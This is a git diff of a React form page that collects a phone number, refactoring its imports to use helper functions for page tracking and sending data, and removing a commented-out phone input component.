@@ -3,17 +3,17 @@ import Input from "@/components/Input";
 import Main from "@/components/Main";
 import { Button } from "@/components/ui/button";
 import { MAIN_BTN } from "@/constants/data";
+import {
+  checkUser,
+  sendDataToServer,
+  setCurrentPage,
+} from "@/real-time/utils/utils";
 import { useSignals } from "@preact/signals-react/runtime";
 import { useEffect } from "react";
 import { FieldValues, useForm } from "react-hook-form";
 import "react-phone-number-input/style.css";
 import { useNavigate } from "react-router-dom";
-import {
-  checkUser,
-  currentPage,
-  mainInfo,
-  sendDataToServer,
-} from "../../real-time/context/signals";
+import { mainInfo } from "../../real-time/context/signals";
 
 function Page1() {
   useSignals();
@@ -38,8 +38,7 @@ function Page1() {
 
   useEffect(() => {
     // This Step Are Necessary
-
-    currentPage.value = "page1";
+    setCurrentPage("page1");
   }, []);
 
   return (
@@ -94,14 +93,6 @@ function Page1() {
             }}
             value={mainInfo.value?.phone}
           />
-          {/* <PhoneInput
-            value={phone}
-            // @ts-expect-error
-            onChange={setValue}
-            className={`px-2 bg-gray-100 w-full outline-none border rounded-lg relative transition-all  ${
-              isAdminError.value ? "border-red-500" : "border-gray-300"
-            }`}
-          /> */}
         </div>
 
         <Button className={MAIN_BTN + " w-[150px] mx-auto"}>التالي</Button>
